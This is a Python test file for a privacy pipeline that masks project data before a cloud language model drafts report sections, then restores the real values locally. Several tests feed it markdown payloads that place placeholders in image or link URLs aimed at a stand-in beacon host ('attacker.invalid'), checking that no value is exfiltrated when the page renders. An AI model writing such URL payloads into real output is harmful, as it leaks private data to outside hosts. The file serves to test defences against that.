"""R1 end to end on the local side: drafting prompts, scrubbing, reintegration.

The cloud is scripted; what is under test is what the core sends and what it
writes back.
"""

from __future__ import annotations

import asyncio
import json
import re
from pathlib import Path

import httpx
import pytest
from markdown_it import MarkdownIt
from privdeep.models.document import Cell, Document, DocumentKind, Span
from privdeep.models.facts import FACT_RE, NOT_RECORDED
from privdeep.models.outline import Outline, Section
from privdeep.tier1_local.fact_store import build_fact_store
from privdeep.tier1_local.slot_masker import SLOT_RE, Entity, LocalMappingTable
from privdeep.tier2_cloud.abstract_payload import ATTRIBUTE_SCHEMA, FACT_REF_FORMAT, AbstractPayload
from privdeep.tier2_cloud.cloud_client import CloudClient
from privdeep.tier2_cloud.macro_planner import MacroPlanner
from privdeep.tier2_cloud.section_drafter import SectionDrafter
from privdeep.tier3_reconcile.slot_reintegrator import ReintegrationRefused, SlotReintegrator

SALT = b"r1-facts-salt"


def table_doc(rows: list[list[str]], doc_id: str = "sheet") -> Document:
    lines, cells, pos = [], [], 0
    for r, row in enumerate(rows, start=1):
        for c, v in enumerate(row, start=1):
            cells.append(Cell("Budget", r, c, v, Span(pos, pos + len(v))))
            pos += len(v) + 1
        lines.append("\t".join(row))
    return Document(doc_id, DocumentKind.XLSX, Path(f"{doc_id}.xlsx"),
                    "\n".join(lines) + "\n", cells=cells)


def world(zephyr_budget="250000", zephyr_spent="187432.55"):
    doc = table_doc([["Project", "Budget (USD)", "Spent", "Contract"],
                     ["Project Zephyr", zephyr_budget, zephyr_spent, "NB_2026*1"],
                     ["Pilot Kestrel", "45000", "51237.75", "NB-2026-1187"]])
    table = LocalMappingTable(SALT)
    for name in ("Project Zephyr", "Pilot Kestrel", "Project Aurora"):
        table.slot_for(Entity(name, "PROJECT"))
    return table, build_fact_store([doc], table)


def sid(table, name):
    return table.slot_for(Entity(name, "PROJECT"))


def hx(table, name):
    return SLOT_RE.fullmatch(sid(table, name)).group("hex")


def reint(table, store, **kw):
    return SlotReintegrator(table, facts=store, **kw)


class TestDerivedRendering:
    def test_cents_survive_an_authority_written_without_decimals(self):
        """Regression: the unspent balance used to render as 62567."""
        table, store = world()
        assert store.get(hx(table, "Project Zephyr"), "UNSPNTAM").rendering() == "62567.45"


class TestReintegration:
    def test_a_fact_is_written_with_its_unit(self):
        table, store = world()
        z = hx(table, "Project Zephyr")
        r = reint(table, store).reintegrate(f"Authority stood at ⟦FACT:{z}.AUTHAMT⟧ in June.")
        assert r.text == "Authority stood at 250000 USD in June."
        assert (r.facts_resolved, r.facts_unavailable) == (1, 0)

    def test_derived_facts_resolve(self):
        table, store = world()
        k = hx(table, "Pilot Kestrel")
        r = reint(table, store).reintegrate(f"The overrun was ⟦FACT:{k}.OVRRUNAM⟧.")
        assert "6237.75 USD" in r.text

    def test_an_advertised_but_absent_attribute_is_not_recorded_not_refused(self):
        table, store = world()
        k = hx(table, "Pilot Kestrel")
        # Alongside a resolved reference, so the sentence is not pruned.
        r = reint(table, store).reintegrate(
            f"Authority ⟦FACT:{k}.AUTHAMT⟧, revised on ⟦FACT:{k}.DATEREV⟧.")
        assert NOT_RECORDED in r.text and r.facts_unavailable == 1

    def test_a_referent_with_no_facts_at_all_is_unavailable_not_invented(self):
        """Aurora was masked but has no row. Binding only referents with facts
        would have refused this section as an invented reference."""
        table, store = world()
        a, z = hx(table, "Project Aurora"), hx(table, "Project Zephyr")
        r = reint(table, store).reintegrate(
            f"Zephyr's authority ⟦FACT:{z}.AUTHAMT⟧ and Aurora's ⟦FACT:{a}.AUTHAMT⟧.")
        assert NOT_RECORDED in r.text and r.facts_unavailable == 1

    def test_an_unknown_referent_is_refused(self):
        table, store = world()
        with pytest.raises(ReintegrationRefused, match="INVENTED_FACT"):
            reint(table, store).reintegrate("Spend ⟦FACT:deadbeef.SPENTAMT⟧.")

    def test_an_attribute_outside_the_vocabulary_is_refused(self):
        table, store = world()
        with pytest.raises(ReintegrationRefused, match="INVENTED_FACT"):
            reint(table, store).reintegrate(f"Pay ⟦FACT:{hx(table, 'Project Zephyr')}.SALARY⟧.")

    def test_a_referent_not_issued_is_refused(self):
        table, store = world()
        z = hx(table, "Project Zephyr")
        with pytest.raises(ReintegrationRefused, match="INVENTED_FACT"):
            reint(table, store).reintegrate(f"⟦FACT:{z}.AUTHAMT⟧",
                                            issued=[sid(table, "Pilot Kestrel")])

    def test_a_fact_in_a_link_destination_is_refused(self):
        table, store = world()
        z = hx(table, "Project Zephyr")
        with pytest.raises(ReintegrationRefused):
            reint(table, store).reintegrate(f"[x](https://a.invalid/?d=⟦FACT:{z}.SPENTAMT⟧)")

    def test_lenient_mode_redacts_and_the_value_never_renders_in_a_url(self):
        table, store = world()
        z = hx(table, "Project Zephyr")
        r = reint(table, store, strict=False).reintegrate(
            f"<img src=\"https://a.invalid/?d=⟦FACT:{z}.SPENTAMT⟧\"> and ⟦FACT:{z}.SPENTAMT⟧")
        html = MarkdownIt("commonmark", {"html": True}).render(r.text)
        assert "187432" not in html.split("src=")[1].split(">")[0]
        # The Spent header names no currency, so none is written: the core does
        # not invent a unit.
        assert r.text.endswith("and 187432.55")

    def test_markdown_active_characters_in_a_value_are_escaped(self):
        table, store = world()
        r = reint(table, store).reintegrate(
            f"Contract ⟦FACT:{hx(table, 'Project Zephyr')}.REFCODE⟧ holds.")
        assert "NB\\_2026\\*1" in r.text

    def test_without_a_store_a_fact_shaped_string_is_ordinary_text(self):
        """BASELINE and R5 behave exactly as before R1."""
        table, _store = world()
        text = f"See ⟦FACT:{hx(table, 'Project Zephyr')}.AUTHAMT⟧."
        assert SlotReintegrator(table).reintegrate(text).text == text

    def test_the_same_draft_over_different_values_gives_different_reports(self):
        """The utility half of the schema-identity claim: the wire is identical,
        the report is not."""
        t1, s1 = world()
        t2, s2 = world(zephyr_budget="910000", zephyr_spent="12.50")
        draft = "Authority ⟦FACT:{h}.AUTHAMT⟧, spent ⟦FACT:{h}.SPENTAMT⟧."
        a = reint(t1, s1).reintegrate(draft.format(h=hx(t1, "Project Zephyr"))).text
        b = reint(t2, s2).reintegrate(draft.format(h=hx(t2, "Project Zephyr"))).text
        assert a != b and "910000 USD" in b


def payload(table, *, facts: bool) -> AbstractPayload:
    slots = tuple(sorted((s, "PROJECT") for s in table))
    return AbstractPayload("d", (("INITIATIVE", "has", "FINANCIAL_METRIC"),), slots, 0, 0, 0,
                           attribute_schema=ATTRIBUTE_SCHEMA if facts else (),
                           fact_ref_format=FACT_REF_FORMAT if facts else "")


class Gate:
    def __init__(self, text: str) -> None:
        self.text, self.bodies = text, []

    def __call__(self, req: httpx.Request) -> httpx.Response:
        self.bodies.append(json.loads(req.content))
        return httpx.Response(200, json={
            "model": "claude-sonnet-5", "stop_reason": "end_turn",
            "usage": {"input_tokens": 1, "output_tokens": 1},
            "content": [{"type": "text", "text": self.text}]})


def draft(table, text, *, facts=True):
    g = Gate(text)
    d = SectionDrafter(CloudClient("http://m:5050", transport=httpx.MockTransport(g)))
    sec = Section("s1", "Budget", "Explain", 300, (sid(table, "Project Zephyr"),))
    res = asyncio.run(d.draft(sec, Outline("goal", (sec,)), payload(table, facts=facts)))
    return res, g.bodies[0]


class TestDrafting:
    def test_the_prompt_spells_out_each_referents_fact_stem(self):
        table, _ = world()
        _res, body = draft(table, "ok")
        user = body["messages"][0]["content"]
        assert f"facts: ⟦FACT:{hx(table, 'Project Zephyr')}.<ATTR>⟧" in user
        assert "AUTHAMT: amount authorised" in user

    def test_the_only_fact_reference_sent_is_the_constant_example(self):
        from privdeep.tier2_cloud.section_drafter import FACT_EXAMPLE
        table, store = world()
        _res, body = draft(table, "ok")
        sent = {m.group(0) for m in FACT_RE.finditer(json.dumps(body, ensure_ascii=False))}
        assert sent == {FACT_EXAMPLE}
        assert store.referent_for_hex(FACT_RE.fullmatch(FACT_EXAMPLE).group("hex")) is None

    def test_the_fact_system_prompt_is_used_only_with_a_schema(self):
        table, _ = world()
        _r1, with_schema = draft(table, "ok")
        _r2, without = draft(table, "ok", facts=False)
        assert "fact reference" in with_schema["system"]
        assert "fact reference" not in without["system"]

    def test_a_never_issued_referent_or_unknown_code_is_scrubbed(self):
        """Any issued referent is permitted, as for slots: the pipeline lets the
        planner spread them. A never-issued hex or a code outside the
        vocabulary is not."""
        table, _ = world()
        k, z = hx(table, "Pilot Kestrel"), hx(table, "Project Zephyr")
        res, _ = draft(table, f"Kept ⟦FACT:{z}.AUTHAMT⟧ and ⟦FACT:{k}.AUTHAMT⟧, dropped "
                              f"⟦FACT:deadbeef.AUTHAMT⟧ and ⟦FACT:{z}.SALARY⟧.")
        assert f"⟦FACT:{z}.AUTHAMT⟧" in res.text and f"⟦FACT:{k}.AUTHAMT⟧" in res.text
        assert "deadbeef" not in res.text and "SALARY" not in res.text
        assert res.invented_slots == 2

    def test_without_a_schema_the_drafter_does_not_touch_fact_text(self):
        table, _ = world()
        text = "Literal ⟦FACT:deadbeef.AUTHAMT⟧ text."
        res, _ = draft(table, text, facts=False)
        assert res.text == text

    def test_the_outbound_prompt_passes_the_entropy_screen(self):
        import sys
        root = Path(__file__).resolve().parents[3]
        sys.path.insert(0, str(root))
        from gateway.linters.entropy_linter import scan_payload
        table, _ = world()
        _res, body = draft(table, "ok")
        assert not scan_payload(json.dumps(body, ensure_ascii=False)).blocked


class TestPlannerPrompt:
    def test_the_attribute_line_appears_only_with_a_schema(self):
        table, _ = world()
        with_schema = MacroPlanner._user_prompt(payload(table, facts=True), "g")
        without = MacroPlanner._user_prompt(payload(table, facts=False), "g")
        assert "ATTRIBUTES every placeholder" in with_schema and "AUTHAMT" in with_schema
        assert "ATTRIBUTES" not in without


class TestPruningSentencesThatSayNothing:
    """27 of 55 sentences in the first live R1 report carried "[not recorded]"."""

    def test_a_sentence_whose_every_reference_is_absent_is_dropped(self):
        table, store = world()
        k, z = hx(table, "Pilot Kestrel"), hx(table, "Project Zephyr")
        r = reint(table, store).reintegrate(
            f"Authority was ⟦FACT:{z}.AUTHAMT⟧. Delivered ⟦FACT:{k}.DELIVQTY⟧ trails "
            f"⟦FACT:{k}.COMMQTY⟧. The review continues.")
        assert r.text == "Authority was 250000 USD. The review continues."
        assert r.sentences_pruned == 1 and NOT_RECORDED not in r.text

    def test_a_sentence_with_any_resolved_reference_is_kept(self):
        table, store = world()
        z = hx(table, "Project Zephyr")
        r = reint(table, store).reintegrate(
            f"Authority ⟦FACT:{z}.AUTHAMT⟧ was revised on ⟦FACT:{z}.DATEREV⟧.")
        assert r.sentences_pruned == 0 and NOT_RECORDED in r.text and "250000 USD" in r.text

    def test_sentences_without_fact_references_are_never_touched(self):
        table, store = world()
        text = "The programme continues. Risks remain open."
        assert reint(table, store).reintegrate(text).text == text

    def test_an_invented_reference_still_refuses_rather_than_being_pruned(self):
        table, store = world()
        k = hx(table, "Pilot Kestrel")
        with pytest.raises(ReintegrationRefused, match="INVENTED_FACT"):
            reint(table, store).reintegrate(
                f"Delivered ⟦FACT:{k}.DELIVQTY⟧ against ⟦FACT:{k}.SALARY⟧.")

    def test_a_list_item_that_becomes_empty_is_removed_whole(self):
        table, store = world()
        k, z = hx(table, "Pilot Kestrel"), hx(table, "Project Zephyr")
        r = reint(table, store).reintegrate(
            f"- Authority ⟦FACT:{z}.AUTHAMT⟧.\n- Revised ⟦FACT:{k}.DATEREV⟧.\n- Done.")
        assert r.text == "- Authority 250000 USD.\n- Done." and r.sentences_pruned == 1

    def test_table_rows_and_headings_are_not_pruned(self):
        table, store = world()
        ref = f"⟦FACT:{hx(table, 'Pilot Kestrel')}.DATEREV⟧"
        r = reint(table, store).reintegrate(f"| Revised | {ref} |\n|---|---|\n\n# Heading {ref}")
        assert r.sentences_pruned == 0 and r.text.count(NOT_RECORDED) == 2

    def test_fenced_code_is_not_pruned(self):
        """A reference inside code is a transport position and strict mode
        refuses it; lenient mode redacts it. Either way pruning leaves the fence
        alone."""
        table, store = world()
        ref = f"⟦FACT:{hx(table, 'Pilot Kestrel')}.DATEREV⟧"
        r = reint(table, store, strict=False).reintegrate(f"```\nnote {ref}.\n```")
        assert r.sentences_pruned == 0 and "note [redacted reference]." in r.text

    @pytest.mark.parametrize("attr", ["AUTHAMT", "DATEREV"], ids=["recorded", "absent"])
    def test_a_reference_in_a_url_refuses_whether_or_not_it_is_recorded(self, attr):
        """F21. With pruning first, the absent reference went with its sentence
        and the section was written; only the recorded one refused."""
        table, store = world()
        ref = f"⟦FACT:{hx(table, 'Project Zephyr')}.{attr}⟧"
        with pytest.raises(ReintegrationRefused, match="SLOT_IN_TRANSPORT_POSITION: 1 "):
            reint(table, store).reintegrate(f"See ![](https://a.invalid/?d={ref}) here.")

    def test_a_prune_that_would_open_a_transport_position_is_not_applied(self):
        """Dropping the middle sentence takes the backtick that closes the first
        code span, and the next one then pairs across the slot. Refusing would
        refuse only when the attribute is absent, so the unpruned draft, which
        passed both checks, is written instead."""
        table, store = world()
        z = hx(table, "Project Zephyr")
        draft = f"`p. q` ⟦FACT:{z}.DATEREV⟧. r {sid(table, 'Pilot Kestrel')} `s`."
        r = reint(table, store).reintegrate(draft)
        assert r.text == f"`p. q` {NOT_RECORDED}. r Pilot Kestrel `s`."
        assert (r.sentences_pruned, r.prune_reverted, r.unsafe_positions) == (0, 1, 0)

    def test_lenient_mode_still_prunes_and_redacts(self):
        table, store = world()
        z = hx(table, "Project Zephyr")
        draft = f"`p. q` ⟦FACT:{z}.DATEREV⟧. r {sid(table, 'Pilot Kestrel')} `s`."
        r = reint(table, store, strict=False).reintegrate(draft)
        assert "Pilot Kestrel" not in r.text and r.sentences_pruned == 1
        assert r.prune_reverted == 0 and r.unsafe_positions == 1

    def test_the_reverted_draft_writes_no_value_into_a_link(self):
        """INS5 review. The reversion writes the absent fill where the sentinel
        stood; while that fill was "[not recorded]" it closed a link the
        sentinel did not, and the no-space value below reached its href."""
        table, store = world()
        acme = table.slot_for(Entity("ACME", "ORG"))
        z = hx(table, "Project Zephyr")
        draft = (f"`p. q` ⟦FACT:{z}.DATEREV⟧(https://x.invalid/?d={acme}). "
                 f"r {sid(table, 'Pilot Kestrel')} `s`.")
        r = reint(table, store).reintegrate(draft)
        assert r.prune_reverted == 1 and f"{NOT_RECORDED}(https://x.invalid/?d=ACME)" in r.text
        assert all("ACME" not in u for u in urls(r.text))

    def test_the_baseline_reintegrator_never_prunes(self):
        table, _ = world()
        text = f"Revised ⟦FACT:{hx(table, 'Pilot Kestrel')}.DATEREV⟧. Kept."
        assert SlotReintegrator(table).reintegrate(text).text == text


def urls(markdown: str) -> list[str]:
    html = MarkdownIt("commonmark", {"html": True}).render(markdown)
    return re.findall(r'(?:href|src)="([^"]*)"', html)


class TestTheAbsentFillIsInert:
    """INS5 review. The position checks stand a sentinel in for every reference,
    so they model the written text only if what replaces the sentinel cannot
    open structure either. Values were escaped; "[not recorded]" was not. Each
    case runs with a recorded and an absent attribute, beside a recorded one so
    that the sentence is kept."""

    BEACON = "https://attacker.invalid/beacon"

    def test_the_fill_has_nothing_to_escape(self):
        from privdeep.tier3_reconcile.slot_reintegrator import _MD_ACTIVE
        assert not _MD_ACTIVE.search(NOT_RECORDED) and NOT_RECORDED[0].isalpha()

    @pytest.mark.parametrize("attr", ["SPENTAMT", "DATEREV"], ids=["recorded", "absent"])
    def test_no_value_reaches_a_link_the_fill_would_have_closed(self, attr):
        """Reached on b06ed46 as well: this route needs no pruning."""
        table, store = world()
        acme = table.slot_for(Entity("ACME", "ORG"))
        z = hx(table, "Project Zephyr")
        r = reint(table, store).reintegrate(
            f"Budget ⟦FACT:{z}.AUTHAMT⟧ and ⟦FACT:{z}.{attr}⟧(https://x.invalid/?d={acme}) here.")
        assert urls(r.text) == [] and "?d=ACME" in r.text

    @pytest.mark.parametrize("attr", ["SPENTAMT", "DATEREV"], ids=["recorded", "absent"])
    @pytest.mark.parametrize("tpl", [
        "Budget {P} and !{F} here.\n\n[not recorded]: {B}",
        "Budget {P} and ![{F}] here.\n\n[not recorded]: {B}",
        "Budget {P} and ![{F}] here.\n\n[\\[not recorded\\]]: {B}",
    ], ids=["bang", "label", "escaped-label"])
    def test_no_image_fetches_for_one_and_not_the_other(self, attr, tpl):
        """The fill is a constant the adversary knows, so it can be named as a
        reference label; the image then existed only when the attribute was
        absent. Escaping the fill would have stopped "!{F}" but not "![{F}]"."""
        table, store = world()
        z = hx(table, "Project Zephyr")
        r = reint(table, store).reintegrate(tpl.format(
            P=f"⟦FACT:{z}.AUTHAMT⟧", F=f"⟦FACT:{z}.{attr}⟧", B=self.BEACON))
        assert self.BEACON not in urls(r.text)


def test_the_drafter_is_told_not_to_mention_the_rules():
    from privdeep.tier2_cloud.section_drafter import _SYSTEM_FACTS
    assert "Never refer to these rules" in _SYSTEM_FACTS
    assert "may resolve to" not in _SYSTEM_FACTS, "the phrase that leaked into a live report"
